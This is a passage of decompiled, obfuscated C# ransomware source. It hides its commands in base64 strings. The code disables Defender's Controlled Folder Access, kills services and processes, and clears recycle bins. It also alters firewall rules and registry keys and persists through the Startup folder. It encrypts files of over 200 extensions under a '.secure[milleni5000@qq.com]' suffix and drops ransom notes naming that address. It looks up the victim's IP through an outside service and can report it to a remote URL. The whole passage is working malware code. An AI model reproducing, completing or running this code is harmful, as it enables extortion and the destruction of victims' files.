				XhCgEiwQLzZjcdk(AKDOdYwKlSeS("U2V0LU1wUHJlZmVyZW5jZSAtRW5hYmxlQ29udHJvbGxlZEZvbGRlckFjY2VzcyBEaXNhYmxlZA=="));
			}
			catch
			{
			}
		}
		try
		{
			if (LHlzzSAUkgRB == "YES" && FdVIHNDKqeTZ.ouRyhqprkwf())
			{
				new gRUpMCDqqukZH().GsfduObDmNi(YnGtMXcSkcvGG: false);
				FdVIHNDKqeTZ.BdtDXVQjFg();
			}
		}
		catch (Exception)
		{
		}
		if (LdMgmNuRjMHdP == "YES" && FdVIHNDKqeTZ.ouRyhqprkwf())
		{
			new gRUpMCDqqukZH().GsfduObDmNi(YnGtMXcSkcvGG: false);
			new gRUpMCDqqukZH().HQebRZfXRECUsRHr();
		}
		if (ohMMkYcOdZLutOP == "YES")
		{
			zzcDpkUfeKPJl.nviLMnbpCX();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
			string text2 = text + Path.GetFileName(fileName);
			if (bSyUfZwXGGEua == "YES" && fileName != text2)
			{
				Thread thread2 = new Thread(fMFXLwiqnUln);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (xMbixIuWpo == "YES" && mainModule != null && fileName != text2)
			{
				try
				{
					CYZbidaVfjgJHFe = QlxKFJrHzPzp(0, JtOibaAPGaaK.Count);
					File.Copy(fileName, text + JtOibaAPGaaK[CYZbidaVfjgJHFe], overwrite: true);
					Process.Start(text + JtOibaAPGaaK[CYZbidaVfjgJHFe]);
					PtvLsYuPhmTnEdYv();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (qKrJyYBCIXlJpBg == "YES" && DateTime.Now < GdKgynbbtZ)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (xFnwKicmhAX == "YES" && DateTime.Now > scPORhTpLEY)
			{
				PtvLsYuPhmTnEdYv();
			}
		}
		catch
		{
		}
		ayrkZmFbFlgGn();
		Thread thread3 = new Thread((ThreadStart)delegate
		{
			Parallel.ForEach(IsuqrgPxxEAjz, delegate(string AAzTdbEblGewZgDF)
			{
				lDUkCKSsmpNIssDW("sc.exe", AAzTdbEblGewZgDF);
			});
			Parallel.ForEach(ZZWNuPwHETb, delegate(string RMJDQFhqcfQvp)
			{
				lDUkCKSsmpNIssDW("net.exe", RMJDQFhqcfQvp);
			});
			Parallel.ForEach(WoxuHzlznJX, delegate(string DdvBMJbBQoiVWtXO)
			{
				lDUkCKSsmpNIssDW(AKDOdYwKlSeS("dGFza2tpbGwuZXhl"), DdvBMJbBQoiVWtXO);
			});
			if (BkZfmfIJaDHi == "YES")
			{
				Parallel.ForEach(HBRgiNDAjeesN, delegate(string sJvlxlZjie)
				{
					lDUkCKSsmpNIssDW(AKDOdYwKlSeS("dGFza2tpbGwuZXhl"), "/IM " + sJvlxlZjie + " /f");
				});
			}
			if (!SpBshlcYoytUROp().Contains("XP"))
			{
				MWUCLrCldjxwcGK(akLRVmSHNxrIS);
			}
			else
			{
				Parallel.ForEach(pXrFOGVcFZg, delegate(string PZGCtHVegBadDPwN)
				{
					lDUkCKSsmpNIssDW(AKDOdYwKlSeS(xhaGFQsmQqpIC("lhXZu4WatRWYzNnd")), PZGCtHVegBadDPwN);
				});
			}
			Parallel.ForEach(ewBPDbkTtCxmWjU, delegate(string NWlzMCqRcKdV)
			{
				lDUkCKSsmpNIssDW(AKDOdYwKlSeS("ZGVsLmV4ZQ=="), NWlzMCqRcKdV);
			});
			Parallel.ForEach(rPYKKHjiUSNly, delegate(string ofkixAavlvqS)
			{
				lDUkCKSsmpNIssDW("icacls", ofkixAavlvqS);
			});
		});
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && jNhVZUBUVzjk)
			{
				try
				{
					Thread thread4 = new Thread(UUfFMaxFchEUmn.SESzQXDRMivg);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			lDUkCKSsmpNIssDW("cmd.exe", AKDOdYwKlSeS("L2MgcmQgL3MgL3EgJVNZU1RFTURSSVZFJVxcJFJlY3ljbGUuYmlu"));
			lDUkCKSsmpNIssDW("cmd.exe", AKDOdYwKlSeS("L2MgcmQgL3MgL3EgRDpcXCRSZWN5Y2xlLmJpbg=="));
			lDUkCKSsmpNIssDW(AKDOdYwKlSeS("bmV0c2g="), AKDOdYwKlSeS("YWR2ZmlyZXdhbGwgZmlyZXdhbGwgc2V0IHJ1bGUgZ3JvdXA9XCJOZXR3b3JrIERpc2NvdmVyeVwiIG5ldyBlbmFibGU9WWVz"));
			lDUkCKSsmpNIssDW(AKDOdYwKlSeS("bmV0c2g="), AKDOdYwKlSeS("YWR2ZmlyZXdhbGwgZmlyZXdhbGwgc2V0IHJ1bGUgZ3JvdXA9IkZpbGUgYW5kIFByaW50ZXIgU2hhcmluZyIgbmV3IGVuYWJsZT1ZZXM="));
		}
		SecureString secureString = new SecureString();
		if (QTcKkzIUxkQHR == "NO")
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			WDdwjpHlSbuvG = "SBMB0P5WYGI2Z437I19R4YM2PXRF0MND";
		}
		dQEfVjRKWpm = IyNwnTsFDBq.QaROgAqvhnuv(PvfeiZrHecxzIWcj(secureString));
		if (VOwmTqwXJKX)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), RUwwuHFucPDwiLF)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), RUwwuHFucPDwiLF), string.Concat(AKDOdYwKlSeS("Q2xpZW50IElQOiA="), new WebClient().DownloadString(AKDOdYwKlSeS("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r\n", AKDOdYwKlSeS("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", AKDOdYwKlSeS("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), dQEfVjRKWpm));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), RUwwuHFucPDwiLF), "\r\nAdditional KeyID: " + dQEfVjRKWpm);
				}
			}
			catch (Exception ex7)
			{
				if (nsUlKTEfYADHHkY)
				{
					try
					{
						File.AppendAllText(DQNgDvGHNxeJ, "Error while creating Local Report: " + ex7.Message + "\r\n");
					}
					catch (Exception)
					{
					}
				}
			}
		}
		PsIsmnbGDcct.akrVUPwUXz(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), VXMsLRiDEpX), mcFFxPzZat(dQEfVjRKWpm), null, null, "Installer...", "Ctrl+Shift+X", null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			eqBfvUvEoFAlLF();
		}
		try
		{
			zgEGVOYtvJJw(new string[1] { "[auto]" }, new string[226]
			{
				"acl", "adt", "adts", "aexpk", "RDP", "rat", "ani", "arw", "asc", "asf",
				"pnf", "avci", "aw", "camp", "pko", "pbk", "msp", "iff", "hta", "dcs",
				"dqy", "dsn", "elm", "img", "vhd", "spl", "skr", "rll", "ico", "lua",
				"sh", "xsl", "vbs", "jar", "7", "dat", "txt", "jpeg", "gif", "jpg",
				"png", "php", "cs", "cpp", "rar", "zip", "html", "htm", "xlsx", "xls",
				"avi", "mp4", "ppt", "doc", "docx", "sxi", "sxw", "odt", "hwp", "tar",
				"bz2", "mkv", "eml", "msg", "ost", "pst", "edb", "sql", "accdb", "mdb",
				"dbf", "odb", "myd", "c", "swift", "cpp", "pas", "asm", "key", "pfx",
				"pem", "p12", "csr", "gpg", "aes", "vsd", "odg", "raw", "nef", "svg",
				"psd", "vmx", "vmdk", "vdi", "lay6", "sqlite3", "sqlitedb", "java", "class", "mpeg",
				"djvu", "tiff", "backup", "pdf", "cert", "docm", "xlsm", "dwg", "bak", "qbw",
				"nd", "tlg", "lgb", "pptx", "mov", "xdw", "ods", "wav", "mp3", "aiff",
				"flac", "m4a", "csv", "sav", "ora", "mdf", "ldf", "ndf", "dtsx", "rdl",
				"dim", "mrimg", "qbb", "rtf", "7z", "ini", "lnk", "msi", "tmp", "3g2",
				"3gp", "flv", "h264", "rm", "swf", "wmv", "tex", "wpd", "icns", "drv",
				"dmp", "cur", "cpl", "cfg", "cab", "vb", "cgi", "pps", "odp", "xhtml",
				"rss", "py", "part", "jsp", "js", "css", "cfm", "cer", "asp", "tif",
				"ps", "bmp", "ai", "ttf", "otf", "fon", "fnt", "wsf", "gadget", "com",
				"bin", "bat", "apk", "vcf", "oft", "emlx", "email", "log", "db", "z",
				"targz", "rpm", "pkg", "deb", "arj", "wpl", "wma", "ogg", "mpa", "mid",
				"cda", "aif", "vcd", "toast", "iso", "dmg", "vob", "mpg", "m4v", "h",
				"exe", "lib", "dll", "inf", "sys", "cat", "data", "skn", "xml", "dui",
				"sfx", "cfl", "lgd", "gbk", "GDB", "CNT"
			}, new string[0], PvfeiZrHecxzIWcj(secureString), ".secure[milleni5000@qq.com]");
		}
		catch (Exception ex9)
		{
			if (nsUlKTEfYADHHkY)
			{
				try
				{
					File.AppendAllText(DQNgDvGHNxeJ, "Finish process: " + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt"))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
				streamWriter.WriteLine(AKDOdYwKlSeS("WW91ciBmaWxlcyBhcmUgc2VjdXJlZC4uLg0KbWlsbGVuaTUwMDBAcXEuY29t"));
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(AKDOdYwKlSeS("S2V5IElkZW50aWZpZXI6IA=="));
				streamWriter.WriteLine(dQEfVjRKWpm);
				if (coIRNZWTDTfr == "NO")
				{
					streamWriter.WriteLine("\r\n");
					streamWriter.WriteLine(AKDOdYwKlSeS("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(IBplFKRVOPC.Count));
				}
			}
			else
			{
				File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt", "\r\nAditional KeyId:\r\n" + dQEfVjRKWpm);
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in xoGEPqVelYnAq)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + "\\RESTORE_FILES_INFO.txt"))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt", item + "\\RESTORE_FILES_INFO.txt", overwrite: true);
				}
				else
				{
					File.AppendAllText(item + "\\RESTORE_FILES_INFO.txt", "\r\nAditional KeyId:\r\n" + dQEfVjRKWpm);
				}
			}
			catch (Exception)
			{
			}
			if (!dKzpPcnoPN && num > 10)
			{
				break;
			}
		}
		if (qVMnoFgnZjoqp == "YES")
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta"))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta");
					streamWriter2.WriteLine(AKDOdYwKlSeS("MESSAGERICH"));
					streamWriter2.WriteLine("\r\n");
					streamWriter2.WriteLine(AKDOdYwKlSeS("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPktleSBJZGVudGlmaWVyOiA="));
					streamWriter2.WriteLine(dQEfVjRKWpm + AKDOdYwKlSeS("PC9wPg=="));
					if (coIRNZWTDTfr == "NO")
					{
						streamWriter2.WriteLine("\r\n");
						streamWriter2.WriteLine(AKDOdYwKlSeS("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + AKDOdYwKlSeS("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(IBplFKRVOPC.Count) + AKDOdYwKlSeS("PC9wPg=="));
					}
				}
				else
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta", AKDOdYwKlSeS("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + "\r\nAditional KeyId:\r\n" + dQEfVjRKWpm + AKDOdYwKlSeS("PC9wPg=="));
				}
			}
			catch
			{
			}
		}
		if (chdVxkZdWfF == "YES")
		{
			try
			{
				if (coIRNZWTDTfr == "NO")
				{
					TZtvpaeBArDn.YtMLGIsTHQvw("URL", "USERNAME", "ACCESO", string.Concat(AKDOdYwKlSeS("Q2xpZW50IElQOiA="), new WebClient().DownloadString(AKDOdYwKlSeS("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r", AKDOdYwKlSeS("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", AKDOdYwKlSeS("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA=="), Convert.ToString(IBplFKRVOPC.Count), "\r\n", AKDOdYwKlSeS("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), dQEfVjRKWpm));
				}
				else
				{
					TZtvpaeBArDn.YtMLGIsTHQvw("URL", "USERNAME", "ACCESO", string.Concat(AKDOdYwKlSeS("Q2xpZW50IElQOiA="), new WebClient().DownloadString(AKDOdYwKlSeS("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r", AKDOdYwKlSeS("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", AKDOdYwKlSeS("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA=="), Convert.ToString(IBplFKRVOPC.Count), "\r\n", AKDOdYwKlSeS("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), dQEfVjRKWpm));
				}
			}
			catch
			{
			}
		}
		if (FWugbVVzWRUMz == "YES")
		{
			try
			{
				wtRAYTGJCgwmW.bSLBLlKmJHr(new Uri(""));
			}
			catch
			{
			}
		}
		if (qVMnoFgnZjoqp == "NO")
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt"))
				{
					Process.Start(AKDOdYwKlSeS("bm90ZXBhZC5leGU="), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta"))
				{
					Process.Start(AKDOdYwKlSeS("bXNodGEuZXhl"), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta");
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(TnpbgwXoGai))
		{
			try
			{
				File.Delete(TnpbgwXoGai);
			}
			catch
			{
			}
		}
		if (nsUlKTEfYADHHkY)
		{
			try
			{
				File.AppendAllText(DQNgDvGHNxeJ, "All Done!");
			}
			catch (Exception)
			{
			}
		}
		if (XKrsfDFRFRzXq == "EVET")
		{
			PtvLsYuPhmTnEdYv();
		}
	}

	public static void fMFXLwiqnUln()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(AKDOdYwKlSeS("VGhpcyBwcm9ncmFtIHJlcXVpcmVzIE1pY3Jvc29mdCAuTkVUIEZyYW1ld29yayB2LiA0LjgyIG9yIHN1cGVyaW9yIHRvIHJ1biBwcm9wZXJseQ=="), AKDOdYwKlSeS("QXRlbnRpb24h"), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int QlxKFJrHzPzp(int fnpezTyLkYXyVIjW, int TYaNPZAaFYeK)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(fnpezTyLkYXyVIjW, TYaNPZAaFYeK);
	}

	public static List<string> egcSvkHHxSUSVFS(string hDcQtXDYZCP, string[] qbjKTKOqNVrBY, string ZJqGjLckVJXvFmgn, string[] gSBLkvPzxrcqLfe, string nahEtwoLsMZbRej)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(hDcQtXDYZCP);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains("C:\\Program Files\\") && !text.Contains("C:\\Program Files (x86)\\") && !text.Contains(":\\Windows\\") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.Contains(":\\ProgramData\\") && !text.Contains(":\\AppData\\") && !text.ToLower().Contains("msocache") && !text.ToLower().Contains("system volume information") && !text.ToLower().Contains("boot") && !text.ToLower().Contains("tor browser") && !text.ToLower().Contains("mozilla") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("google chrome") && !text.ToLower().Contains("application data"))
				{
					array = Directory.GetFiles(text);
					goto IL_0155;
				}
			}
			catch
			{
			}
			continue;
			IL_0155:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains("autoexec.bat") && !fileInfo.FullName.Contains("desktop.ini") && !fileInfo.FullName.Contains("autorun.inf") && !fileInfo.FullName.Contains("ntuser.dat") && !fileInfo.FullName.Contains("NTUSER.DAT") && !fileInfo.FullName.Contains("iconcache.db") && !fileInfo.FullName.Contains("bootsect.bak") && !fileInfo.FullName.Contains("boot.ini") && !fileInfo.FullName.Contains("ntuser.dat.log") && !fileInfo.FullName.Contains("thumbs.db") && !fileInfo.FullName.ToLower().Contains("bootmgr") && !fileInfo.FullName.ToLower().Contains("pagefile.sys") && !fileInfo.FullName.ToLower().Contains("config.sys") && !fileInfo.FullName.ToLower().Contains("ntuser.ini") && !fileInfo.FullName.Contains(AKDOdYwKlSeS("QnVpbGRlcl9Mb2c=")) && !fileInfo.FullName.Contains("RSAKeys") && !fileInfo.FullName.Contains("RESTORE_FILES_INFO") && !fileInfo.FullName.EndsWith(".secure[milleni5000@qq.com]") && !fileInfo.FullName.EndsWith("exe") && !fileInfo.FullName.EndsWith("dll") && !fileInfo.FullName.EndsWith("EXE") && !fileInfo.FullName.EndsWith("DLL") && !fileInfo.FullName.Contains("Recycle.Bin") && !fileInfo.FullName.Contains(VXMsLRiDEpX) && !fileInfo.FullName.Contains(DQNgDvGHNxeJ) && !fileInfo.FullName.Contains(RUwwuHFucPDwiLF))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(AZQbQvBePeaHIkYO) * 1024.0 * 1024.0 && CtXfnSgIllRtC == "YES")
						{
							list.Add(fileInfo.FullName);
							oWkmattkNKtf(list, qbjKTKOqNVrBY, ZJqGjLckVJXvFmgn, gSBLkvPzxrcqLfe, nahEtwoLsMZbRej);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && CtXfnSgIllRtC == "NO")
						{
							list.Add(fileInfo.FullName);
							oWkmattkNKtf(list, qbjKTKOqNVrBY, ZJqGjLckVJXvFmgn, gSBLkvPzxrcqLfe, nahEtwoLsMZbRej);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static List<string> KgnxueJoPR(string rRpRROGIqTewcp)
	{
		List<string> list = new List<string>();
		DirectoryInfo directoryInfo = new DirectoryInfo(rRpRROGIqTewcp);
		try
		{
			foreach (FileInfo item in directoryInfo.EnumerateFiles())
			{
				try
				{
					if (!item.FullName.Contains("C:\\Program Files\\") && !item.FullName.Contains("C:\\Program Files (x86)\\") && !item.FullName.Contains(":\\Windows\\") && !item.FullName.ToLower().Contains("perflogs") && !item.FullName.ToLower().Contains("internet explorer") && !item.FullName.Contains(":\\ProgramData\\") && !item.FullName.Contains(":\\AppData\\") && !item.FullName.ToLower().Contains("autoexec.bat") && !item.FullName.ToLower().Contains("desktop.ini") && !item.FullName.ToLower().Contains("autorun.inf") && !item.FullName.ToLower().Contains("ntuser.dat") && !item.FullName.ToLower().Contains("iconcache.db") && !item.FullName.ToLower().Contains("bootsect.bak") && !item.FullName.ToLower().Contains("boot.ini") && !item.FullName.ToLower().Contains("ntuser.dat.log") && !item.FullName.ToLower().Contains("thumbs.db") && !item.FullName.ToLower().Contains("bootmgr") && !item.FullName.ToLower().Contains("pagefile.sys") && !item.FullName.ToLower().Contains("config.sys") && !item.FullName.ToLower().Contains("ntuser.ini") && !item.FullName.Contains(AKDOdYwKlSeS("QnVpbGRlcl9Mb2c=")) && !item.FullName.Contains("RSAKeys") && !item.FullName.Contains("RESTORE_FILES_INFO") && !item.FullName.EndsWith(".secure[milleni5000@qq.com]") && !item.FullName.EndsWith("exe") && !item.FullName.EndsWith("dll"))
					{
						if (File.Exists(item.FullName) && (double)item.Length <= double.Parse(AZQbQvBePeaHIkYO) * 1024.0 * 1024.0 && CtXfnSgIllRtC == "YES")
						{
							list.Add(item.FullName);
						}
						else if (File.Exists(item.FullName) && CtXfnSgIllRtC == "NO")
						{
							list.Add(item.FullName);
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
			foreach (DirectoryInfo item2 in directoryInfo.EnumerateDirectories("*"))
			{
				if (directoryInfo.FullName.ToLower().Contains("program files") || directoryInfo.FullName.ToLower().Contains(":\\windows") || directoryInfo.FullName.ToLower().Contains("perflogs") || directoryInfo.FullName.ToLower().Contains("internet explorer") || directoryInfo.FullName.ToLower().Contains("programdata") || directoryInfo.FullName.ToLower().Contains("appdata"))
				{
					continue;
				}
				try
				{
					foreach (FileInfo item3 in item2.EnumerateFiles("*", SearchOption.AllDirectories))
					{
						try
						{
							if (!item3.FullName.ToLower().Contains("autoexec.bat") && !item3.FullName.ToLower().Contains("desktop.ini") && !item3.FullName.ToLower().Contains("autorun.inf") && !item3.FullName.ToLower().Contains("ntuser.dat") && !item3.FullName.ToLower().Contains("iconcache.db") && !item3.FullName.ToLower().Contains("bootsect.bak") && !item3.FullName.ToLower().Contains("boot.ini") && !item3.FullName.ToLower().Contains("ntuser.dat.log") && !item3.FullName.ToLower().Contains("thumbs.db") && !item3.FullName.ToLower().Contains("bootmgr") && !item3.FullName.ToLower().Contains("pagefile.sys") && !item3.FullName.ToLower().Contains("config.sys") && !item3.FullName.ToLower().Contains("ntuser.ini") && !item3.FullName.Contains(AKDOdYwKlSeS("QnVpbGRlcl9Mb2c=")) && !item3.FullName.Contains("RSAKeys") && !item3.FullName.Contains("RESTORE_FILES_INFO") && !item3.FullName.EndsWith(".secure[milleni5000@qq.com]") && !item3.FullName.EndsWith("exe") && !item3.FullName.EndsWith("dll"))
							{
								if (File.Exists(item3.FullName) && (double)item3.Length <= double.Parse(AZQbQvBePeaHIkYO) * 1024.0 * 1024.0 && CtXfnSgIllRtC == "YES")
								{
									list.Add(item3.FullName);
								}
								else if (File.Exists(item3.FullName) && CtXfnSgIllRtC == "NO")
								{
									list.Add(item3.FullName);
								}
							}
						}
						catch (UnauthorizedAccessException)
						{
						}
						catch
						{
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
			return list;
		}
		catch (DirectoryNotFoundException)
		{
			return list;
		}
		catch (UnauthorizedAccessException)
		{
			return list;
		}
		catch (PathTooLongException)
		{
			return list;
		}
		catch
		{
			return list;
		}
	}

	public static string lDUkCKSsmpNIssDW(string fDNvotqjvU = "", string ufkEMFIknLaRs = "")
	{
		string result = "";
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = fDNvotqjvU,
				Arguments = ufkEMFIknLaRs,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void XhCgEiwQLzZjcdk(string RNtEVkwXZYaK)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = RNtEVkwXZYaK,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string xhaGFQsmQqpIC(string DQgSzPFzFGg)
	{
		char[] array = DQgSzPFzFGg.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string AKDOdYwKlSeS(string JXiAMjBTnZQwioM)
	{
		byte[] bytes = Convert.FromBase64String(JXiAMjBTnZQwioM);
		return Encoding.UTF8.GetString(bytes);
	}

	public static bool PGrIivvGQcztn()
	{
		WebRequest webRequest = WebRequest.Create("https://www.google.com/");
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void MWUCLrCldjxwcGK(string bJxFcXsIDuz)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = AKDOdYwKlSeS("cG93ZXJzaGVsbC5leGU=");
		processStartInfo.Arguments = "& " + bJxFcXsIDuz;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool TODKGZbpyhrvar(string SVIqDDuRKxr, string tlaPMXShZsvjxb)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(SVIqDDuRKxr, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(tlaPMXShZsvjxb);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(SVIqDDuRKxr, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string PvfeiZrHecxzIWcj(SecureString zjlrQzjHSe)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(zjlrQzjHSe);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void ayrkZmFbFlgGn()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string jXiAMjBTnZQwioM = xhaGFQsmQqpIC("==wcu9Wa0B3Tg42bpRXdjVGeFBSZslmRgU2Zh1WSc52bpNnclZFduVmcyV3QcRlTgM3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(AKDOdYwKlSeS(jXiAMjBTnZQwioM), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(AKDOdYwKlSeS("dnNzYWRtaW4uZXhl"));
					registryKey.DeleteSubKey(AKDOdYwKlSeS("d21pYy5leGU="));
					registryKey.DeleteSubKey(AKDOdYwKlSeS("d2JhZG1pbi5leGU="));
					registryKey.DeleteSubKey(AKDOdYwKlSeS("YmNkZWRpdC5leGU="));
					registryKey.DeleteSubKey(AKDOdYwKlSeS("cG93ZXJzaGVsbC5leGU="));
					registryKey.DeleteSubKey(AKDOdYwKlSeS("ZGlza3NoYWRvdy5leGU="));
					registryKey.DeleteSubKey(AKDOdYwKlSeS("bmV0LmV4ZQ=="));
					registryKey.Close();
				}
				jXiAMjBTnZQwioM = xhaGFQsmQqpIC("u9Wa0F2YpxGcwFEXn9GT05WZ2VEXzV2YpZnclNFX0V2Us9mc052bDRnblJnc1NEXNVEVTl1U");
				registryKey = Registry.LocalMachine.OpenSubKey(AKDOdYwKlSeS(jXiAMjBTnZQwioM), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(AKDOdYwKlSeS("UmFjY2luZQ=="));
					registryKey.Close();
				}
